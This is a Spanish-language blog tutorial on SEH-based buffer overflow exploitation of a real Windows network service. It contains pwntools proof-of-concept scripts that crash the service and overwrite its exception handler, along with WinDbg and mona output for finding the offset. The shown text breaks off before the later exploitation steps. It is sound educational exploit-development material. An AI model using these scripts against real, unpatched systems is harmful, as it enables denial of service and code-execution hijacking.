<!DOCTYPE html>
<html>
  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width initial-scale=1" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="robots" content="noindex">

  <title>SEH Overflow</title>

  <meta name="description" content="Explotación de Buffer Overflow basado en SEH">
  <meta name="author" content="xchg2pwn">
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="SEH Overflow">
  <meta name="twitter:description" content="Explotación de Buffer Overflow basado en SEH">
  <meta name="twitter:creator" content="xchg2pwn">  
  <meta name="twitter:image" content="/exploit-development/windows-user/seh-overflow/image.png" />

  <meta property="og:site_name" content="xchg2pwn" />
  <meta property="og:type" content="article">
  <meta property="og:title" content="SEH Overflow">
  <meta property="og:description" content="Explotación de Buffer Overflow basado en SEH">
  <meta property="og:image" content="/exploit-development/windows-user/seh-overflow/image.png" />

  <link rel="manifest" href="/images/favicons/manifest.json">
  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/exploit-development/windows-user/seh-overflow/image.png">

  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">
  
  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">

  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
  <link rel="alternate" type="application/rss+xml" title="SEH Overflow" href="/feed.xml">
</head>

  <body style="background-color: #282828;">
  
    <span class="mobile btn-mobile-menu">
      <i class="icon icon-list btn-mobile-menu__icon"></i>
      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
    </span>

<header class="panel-cover" style="background-image: url(/images/cover.jpg)">

  <div class="panel-main">
    <div class="panel-main__inner panel-inverted">
      <div class="panel-main__content">

          <img src="/images/profile.jpg" class="user-image zoomable" alt="xchg2pwn">
          <h1 class="panel-cover__title panel-title scale-up-center">xchg2pwn</h1>

        <hr class="panel-cover__divider">
        <p class="panel-cover__description slide-top">Entusiasta del reversing y desarrollo de exploits</p>
        <hr class="panel-cover__divider panel-cover__divider--secondary">

        <div class="navigation-wrapper">
         <nav class="cover-navigation cover-navigation--primary">
            <ul class="navigation">
              <li class="navigation__item grow"><a href="/exploit-development/windows-user" title="xchg2pwn" class="blog-button">Windows User Mode</a></li>
            </ul>
          </nav>

          <nav class="cover-navigation navigation--social">
            <ul class="navigation">
              
              <li class="navigation__item grow">
                <a href="https://github.com/xchg2pwn" title="Github" target="_blank">
                  <i class="icon icon-social-github"></i>
                  <span class="label">GitHub</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://twitter.com/xchg2pwn" title="Twitter" target="_blank">
                  <i class="icon icon-social-twitter"></i>
                  <span class="label">Twitter</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://instagram.com/xchg2pwn" title="Instagram" target="_blank">
                  <i class="icon icon-social-instagram"></i>
                  <span class="label">Instagram</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://youtube.com/@xchg2pwn" title="Youtube" target="_blank">
                  <i class="icon icon-social-youtube"></i>
                  <span class="label">Youtube</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="mailto:xchg2pwn@gmail.com" title="Correo Electronico" target="_blank">
                  <i class="icon icon-mail"></i>
                  <span class="label">Email</span>
                </a>
              </li>

            </ul>
          </nav>
        </div>
      </div>
    </div>

    <div class="panel-cover--overlay"></div>
  </div>
</header>
    <br>
    <div class="content-wrapper">
      <div class="content-wrapper__inner">
        <article class="post-container post-container--single">
    <div class="izquierda">
      <h3 class="post-title">Contenido</h3><br>
      <ul>
        <li><a href="#theory">Theory</a></li>
        <li><a href="#crashing">Crashing Application</a></li>
        <li><a href="#offset">Find Offset</a></li>
        <li><a href="#badchars">Find Badchars</a></li>
        <li><a href="#opcode">Find Opcode</a></li>
        <li><a href="#pivot">Stack Pivot</a></li>
        <li><a href="#commands">Execute Commands</a></li>
      </ul>
  </div>

  <header class="post-header slide-top">
    <h4 class="post-title">Exploit Development</h2>
    <picture><img src="/exploit-development/windows-user/seh-overflow/image.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
    <h2 class="post-title">SEH Overflow</h2><br>
  </header>

<section class="post" id="index">
    <br><p class="plain-text">Además del <a href="/exploit-development/windows-user/stack-overflow">Stack Overflow</a> hay otro tipo de explotación llamada <code class="language-plaintext highlighter-rouge">SEH Overflow</code> que ocurre cuando sobrescribimos la estructura de excepciones SEH, nuevamente utilizaremos una aplicación real para entender como funciona la explotación.</p>
</section>

<section class="post" id="theory">
<br><h3 class="post-title">Theory</h3><br>

<p class="plain-text">Iniciamos con algunos conceptos importantes a aprender para poder explotar esta vulnerabilidad, <code class="language-plaintext highlighter-rouge">SEH</code> o Structured Exception Handling es la forma que tiene Windows de manejar las <code class="language-plaintext highlighter-rouge">excepciones</code>, estas pueden ser de software o hardware, un ejemplo básico en código podria ser el tipico <code class="language-plaintext highlighter-rouge">try/catch</code> para manejar excepciones:</p>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">try</span><span class="p"> {
    </span><span class="c1">// code block to try to execute</span><span class="p">
} </span><span class="o">catch</span><span class="p"> {
    </span><span class="c1">// code block if causes an exception</span><span class="p">  
}</span>
</code></pre></div></div><br>

<p class="plain-text">Algunos conceptos interesantes sobre este controlador de excepciones son:</p>
<p class="plain-text">• La estructura SEH es independiente por cada hilo en ejecución, esta consta de 2 valores, el controlador y el puntero al siguiente SEH.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">dt ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : Ptr32 _EXCEPTION_REGISTRATION_RECORD  
   +0x004 Handler          : Ptr32     _EXCEPTION_DISPOSITION</span>
</code></pre></div></div><br>

<p class="plain-text">• El puntero a la estructura SEH se almacena en la estructura TEB y al ser el primer valor se puede acceder desde <code class="language-plaintext highlighter-rouge">fs:[0]</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">!teb
TEB at 002bf000
    ExceptionList:        01d3ff60
    StackBase:            01d40000
    StackLimit:           01d3c000
    SubSystemTib:         00000000
    FiberData:            00001e00
    ArbitraryUserPointer: 00000000
    Self:                 002bf000
    EnvironmentPointer:   00000000
    ClientId:             00001918 . 00000f18  
    RpcHandle:            00000000
    Tls Storage:          00000000
    PEB Address:          0029b000
    LastErrorValue:       0
    LastStatusValue:      0
    Count Owned Locks:    0
    HardErrorMode:        0

</span><span class="ro">0:000> </span><span class="p">dd fs:[0] L1
0053:00000000  01d3ff60</span>
</code></pre></div></div><br>

<p class="plain-text">• Un programa puede tener multiples controladores SEH y estos estan encadenados entre si por una lista creando una cadena.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">dt ntdll!_EXCEPTION_REGISTRATION_RECORD 0x01d3ff60  
   +0x000 Next             : 0x01d3ffcc _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x7735af20     _EXCEPTION_DISPOSITION  ntdll!_except_handler4+0

</span><span class="ro">0:000> </span><span class="p">dt ntdll!_EXCEPTION_REGISTRATION_RECORD 0x01d3ffcc  
   +0x000 Next             : 0x01d3ffe4 _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x7735af20     _EXCEPTION_DISPOSITION  ntdll!_except_handler4+0

</span><span class="ro">0:000> </span><span class="p">dt ntdll!_EXCEPTION_REGISTRATION_RECORD 0x01d3ffe4  
   +0x000 Next             : 0xffffffff _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x77368c1d     _EXCEPTION_DISPOSITION  ntdll!FinalExceptionHandlerPad45+0  </span>
</code></pre></div></div><br>

<p class="plain-text">• Todas las cadenas terminan con un SEH predeterminado, el siguiente SEH apunta a <code class="language-plaintext highlighter-rouge">0xffffffff</code> que significa que es el ultimo de la cadena.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">dt ntdll!_EXCEPTION_REGISTRATION_RECORD 0x01d3ffe4
   +0x000 Next             : 0xffffffff _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x77368c1d     _EXCEPTION_DISPOSITION  ntdll!FinalExceptionHandlerPad45+0  </span>
</code></pre></div></div><br>

<p class="plain-text">• Si se utiliza la flag <code class="language-plaintext highlighter-rouge">/SAFESEH</code> el programa no será vulnerable ya que usara un controlador seguro.</p>
<p class="plain-text">• Los programas en <code class="language-plaintext highlighter-rouge">x64</code> no son vulnerables a SEH Overflow ya que los archivos tienen controladores de excepciones seguros.</p>

<p class="plain-text">Resumiendo un poco lo anterior la estructura <code class="language-plaintext highlighter-rouge">SEH</code> de podria ver algo asi, donde una encadena a la otra almacenando el puntero al siguiente SEH terminando la cadena con el controlador por defecto que como siguiente SEH apunta a <code class="language-plaintext highlighter-rouge">0xffffffff</code></p>
<a href="/exploit-development/windows-user/seh-overflow/4.png" target="_blank"><div><p><img src="/exploit-development/windows-user/seh-overflow/4.png"></p></div></a>

<p class="plain-text">Para finalizar podemos usar el comando integrado en windbg <code class="language-plaintext highlighter-rouge">!exchain</code> para ver toda la estructura SEH, aunque <code class="language-plaintext highlighter-rouge">mona</code> tambien tiene su propio comando para mostrarla</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">!exchain
01d3ff60: ntdll!_except_handler4+0 (7735af20)
  CRT scope  0, filter: ntdll!DbgUiRemoteBreakin+3b (7738dbab)
                func:   ntdll!DbgUiRemoteBreakin+3f (7738dbaf)
01d3ffcc: ntdll!_except_handler4+0 (7735af20)
  CRT scope  0, filter: ntdll!__RtlUserThreadStart+3cb75 (773847a4)
                func:   ntdll!__RtlUserThreadStart+3cc0e (7738483d)
01d3ffe4: ntdll!FinalExceptionHandlerPad45+0 (77368c1d)
Invalid exception stack at ffffffff

</span><span class="ro">0:000> </span><span class="p">!py mona exchain
Hold on...
[+] Command used:
!py C:\Users\user\Documents\windbg\x86\mona.py exchain
Nr of SEH records : 3
Start of chain (TEB FS:[0]) : 0x01d3ff60
Address     Next SEH    Handler
-------     --------    -------
0x01d3ff60  0x01d3ffcc  0x7735af20 ntdll!_except_handler4
0x01d3ffcc  0x01d3ffe4  0x7735af20 ntdll!_except_handler4
0x01d3ffe4  0xffffffff  0x77368c1d ntdll!FinalExceptionHandlerPad45  </span>
</code></pre></div></div><br>

</section>

<section class="post" id="crashing">
<br><h3 class="post-title">Crashing Application</h3><br>

<p class="plain-text">Nuevamente evitaremos la detección de la vulnerabilidad para ahorrar tiempo y usaremos un exploit de <code class="language-plaintext highlighter-rouge">exploitdb</code> para crear nuestro <code class="language-plaintext highlighter-rouge">poc</code>, resumiendo un poco para que el programa corrompa necesita un <code class="language-plaintext highlighter-rouge">header</code> bastante especifico</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32

payload </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="mi">1000</span><span class="p">

header  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
header </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0xabba1975</span><span class="p">)
header </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0x3</span><span class="p">)
header </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0x1</span><span class="p">)
header </span><span class="o">+= </span><span class="p">p32(</span><span class="no">len</span><span class="p">(payload))
header </span><span class="o">+= </span><span class="p">p32(</span><span class="no">len</span><span class="p">(payload))
header </span><span class="o">+= </span><span class="p">p32(payload[</span><span class="o">-</span><span class="mi">1</span><span class="p">])

content </span><span class="o">= </span><span class="p">header </span><span class="o">+ </span><span class="p">payload

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"Windows"</span><span class="p">, </span><span class="mi">9121</span><span class="p">)  
shell.sendline(content)</span>
</code></pre></div></div><br>

<p class="plain-text">Al ejecutar el poc pasa algo interesante y es que aunque el programa corrompe el <code class="language-plaintext highlighter-rouge">eip</code> no apunta a ninguna parte de nuestra cadena como pasa en un stack overflow</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3 </span><span class="p">exploit.py
[</span><span class="ve">+</span><span class="p">] Opening connection to Windows on port 9121: Done  
[</span><span class="az">*</span><span class="p">] Closed connection to Windows port 9121</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">g
(d0c.18e4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=006fff44 ebx=00000000 ecx=41414141 edx=00780000 esi=006fff08 edi=006fff08
eip=0099166a esp=006ffe00 ebp=006fff80 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
libpal!SCA_ConfigObj::Clear+0xa:
0099166a 8b410c          mov     eax,dword ptr [ecx+0Ch] ds:002b:4141414d=????????  </span>
</code></pre></div></div><br>

<p class="plain-text">Sin embargo lo que si sobrescribimos es la estructura <code class="language-plaintext highlighter-rouge">SEH</code> que ahora apunta a <code class="language-plaintext highlighter-rouge">0x41414141</code> tanto en el controlador como en el puntero al siguiente SEH</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">!exchain
006ffe14: libpal!md5_starts+14783 (00a0d473)  
006fff44: 41414141
Invalid exception stack at 41414141</span>
</code></pre></div></div><br>

<p class="plain-text">Como ha ocurrido una excepción y sobrescribimos el controlador este intentara saltar a la excepcion por lo que apuntara a <code class="language-plaintext highlighter-rouge">0x41414141</code> que si es parte de nuestra cadena</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:007> </span><span class="p">g
(d0c.18e4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=41414141 edx=77af8ac0 esi=00000000 edi=00000000  
eip=41414141 esp=006ff850 ebp=006ff870 iopl=0         nv up ei pl zr na pe nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246  
41414141 ??              ???</span>
</code></pre></div></div><br>

</section>

<section class="post" id="offset">
<br><h3 class="post-title">Find Offset</h3><br>

<p class="plain-text">Ahora necesitamos calcular la cantidad de bytes necesarios antes de sobrescribir los <code class="language-plaintext highlighter-rouge">2</code> valores de la estructura, el siguiente SEH y el controlador de la excepción, para ello podemos usar <code class="language-plaintext highlighter-rouge">mona</code> y crear un patron de caracteres que nos ayudara a calcularlo</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">!py mona pattern_create 1000
Hold on...
[+] Command used:
!py C:\Users\user\Documents\windbg\x86\mona.py pattern_create 1000
Creating cyclic pattern of 1000 bytes
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B  
[+] Preparing output file 'pattern.txt'
    - (Re)setting logfile C:\mona\pattern.txt
Note: don't copy this pattern from the log window, it might be truncated !
It's better to open C:\mona\pattern.txt and copy the pattern from the file</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora cambiamos las <code class="language-plaintext highlighter-rouge">1000 A's</code> del payload por este patrón y enviamos el exploit</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32

payload </span><span class="o">= </span><span class="no">b</span><span class="s">"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"  </span><span class="p">

header  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
header </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0xabba1975</span><span class="p">)
header </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0x3</span><span class="p">)
header </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0x1</span><span class="p">)
header </span><span class="o">+= </span><span class="p">p32(</span><span class="no">len</span><span class="p">(payload))
header </span><span class="o">+= </span><span class="p">p32(</span><span class="no">len</span><span class="p">(payload))
header </span><span class="o">+= </span><span class="p">p32(payload[</span><span class="o">-</span><span class="mi">1</span><span class="p">])

content </span><span class="o">= </span><span class="p">header </span><span class="o">+ </span><span class="p">payload

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"Windows"</span><span class="p">, </span><span class="mi">9121</span><span class="p">)
shell.sendline(content)</span>
</code></pre></div></div><br>

<p class="plain-text">Cuando el programa corrompe los valores de la estructura ahora no son <code class="language-plaintext highlighter-rouge">0x41414141</code> sino que son los caracteres que forman parte del patron creado con mona</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> g
(d7c.18a4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=01bff941 ebx=01bff9c4 ecx=00000139 edx=00000302 esi=01bffa0c edi=00000138
eip=0090dcce esp=01bff998 ebp=01bffec8 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
libpal!SCA_GetToken+0x4e:
0090dcce 88042f          mov     byte ptr [edi+ebp],al      ds:002b:01c00000=??  

</span><span class="ro">0:000> </span><span class="p">!exchain
01bffe0c: libpal!md5_starts+149fb (0097d6eb)
01bfff44: 33654132
Invalid exception stack at 65413165</span>
</code></pre></div></div><br>

<p class="plain-text">La primera forma de calcular el offset es tomar el valor del siguiente SEH y del controlador para pasarselos a <code class="language-plaintext highlighter-rouge">pattern_offset</code> y nos de el offset de cada uno</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> !py mona pattern_offset 65413165
Hold on...
[+] Command used:
!py C:\Users\user\Documents\windbg\x86\mona.py pattern_offset 65413165  
Looking for e1Ae in pattern of 500000 bytes
 - Pattern e1Ae (0x65413165) found in cyclic pattern at position 124
Looking for e1Ae in pattern of 500000 bytes
Looking for eA1e in pattern of 500000 bytes
 - Pattern eA1e not found in cyclic pattern (uppercase)  
Looking for e1Ae in pattern of 500000 bytes
Looking for eA1e in pattern of 500000 bytes
 - Pattern eA1e not found in cyclic pattern (lowercase)  

</span><span class="ro">0:000> </span><span class="p">!py mona pattern_offset 33654132
Hold on...
[+] Command used:
!py C:\Users\user\Documents\windbg\x86\mona.py pattern_offset 33654132  
Looking for 2Ae3 in pattern of 500000 bytes
 - Pattern 2Ae3 (0x33654132) found in cyclic pattern at position 128
Looking for 2Ae3 in pattern of 500000 bytes
Looking for 3eA2 in pattern of 500000 bytes
 - Pattern 3eA2 not found in cyclic pattern (uppercase)  
Looking for 2Ae3 in pattern of 500000 bytes
Looking for 3eA2 in pattern of 500000 bytes
 - Pattern 3eA2 not found in cyclic pattern (lowercase)</span>
</code></pre></div></div><br>

<p class="plain-text">La otra forma mas facil es usar <code class="language-plaintext highlighter-rouge">exchain</code> de mona que detecta directamente el offset al valor del siguiente SEH que es el inicio de la estructura seguido del controlador</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">!py mona exchain
Hold on...
[+] Command used:
!py C:\Users\user\Documents\windbg\x86\mona.py exchain
Nr of SEH records : 2
Start of chain (TEB FS:[0]) : 0x01bffe0c
Address     Next SEH    Handler
-------     --------    -------
0x01bffe0c  0x01bfff44  0x0097d6eb libpal.dll+0x0008d6eb
0x01bfff44  0x65413165  0x33654132  (record smashed at offset 124)  </span>
</code></pre></div></div><br>

<p class="plain-text">Nuestro payload ahora envia <code class="language-plaintext highlighter-rouge">124 A's</code> hasta antes de sobrescribir la estructura SEH, <code class="language-plaintext highlighter-rouge">4 B's</code> que serán el siguiente SEH y <code class="language-plaintext highlighter-rouge">4 C's</code> que serán el controlador, ademas de ello rellenamos con <code class="language-plaintext highlighter-rouge">D's</code> hasta llegar a <code class="language-plaintext highlighter-rouge">1000</code> bytes ya que en la mayoria de casos es necesario forzar que ocurra la excepción enviando una cantidad grande de bytes</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32

offset </span><span class="o">= </span><span class="mi">124</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset

nseh </span><span class="o">= </span><span class="no">b</span><span class="s">"B" </span><span class="o">* </span><span class="mi">4</span><span class="p">
seh </span><span class="o">= </span><span class="no">b</span><span class="s">"C" </span><span class="o">* </span><span class="mi">4</span><span class="p">

payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
payload </span><span class="o">+= </span><span class="p">junk
payload </span><span class="o">+= </span><span class="p">nseh </span><span class="o">+ </span><span class="p">seh
payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"D" </span><span class="o">* </span><span class="p">(</span><span class="mi">1000</span><span class="o"> - </span><span class="no">len</span><span class="p">(payload))  

header  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
header </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0xabba1975</span><span class="p">)
header </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0x3</span><span class="p">)
header </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0x1</span><span class="p">)
header </span><span class="o">+= </span><span class="p">p32(</span><span class="no">len</span><span class="p">(payload))
header </span><span class="o">+= </span><span class="p">p32(</span><span class="no">len</span><span class="p">(payload))
header </span><span class="o">+= </span><span class="p">p32(payload[</span><span class="o">-</span><span class="mi">1</span><span class="p">])

content </span><span class="o">= </span><span class="p">header </span><span class="o">+ </span><span class="p">payload

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"Windows"</span><span class="p">, </span><span class="mi">9121</span><span class="p">)
shell.sendline(content)</span>
</code></pre></div></div><br>

<p class="plain-text">Al enviar el exploit el programa corrompe pero ahora controlamos la estructura SEH con el siguiente SEH con el valor <code class="language-plaintext highlighter-rouge">0x42424242</code> y el controlador con <code class="language-plaintext highlighter-rouge">0x43434343</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">g
(1914.1074): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=01bff944 ebx=01bff9c4 ecx=00000139 edx=00000302 esi=01bffa0c edi=00000138
eip=008fdcce esp=01bff998 ebp=01bffec8 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
libpal!SCA_GetToken+0x4e:
008fdcce 88042f          mov     byte ptr [edi+ebp],al      ds:002b:01c00000=??  

</span><span class="ro">0:000> </span><span class="p">!exchain
01bffe0c: libpal!md5_starts+149fb (0096d6eb)
01bfff44: 43434343
Invalid exception stack at 42424242</span>
</code></pre></div></div><br>

<p class="plain-text">Si seguimos la ejecución, como ocurrio una excepción ejecutara el primer controlador del SEH y como lo hemos sobrescrito con <code class="language-plaintext highlighter-rouge">0x43434343</code> intentara saltar a esa dirección</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">g
(1914.1074): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=43434343 edx=77af8ac0 esi=00000000 edi=00000000
eip=43434343 esp=01bff3e8 ebp=01bff408 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
43434343 ??              ???</span>
</code></pre></div></div><br>

<p class="plain-text">Algo a tener en cuenta es que cuando ocurre la excepción los valores del SEH se mueven al <code class="language-plaintext highlighter-rouge">stack</code> parecido a cuando se llama a una función, lo que nos interesa es que en la dirección <code class="language-plaintext highlighter-rouge">esp + 8</code> se encuentra el puntero hacia el siguiente SEH</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">!exchain
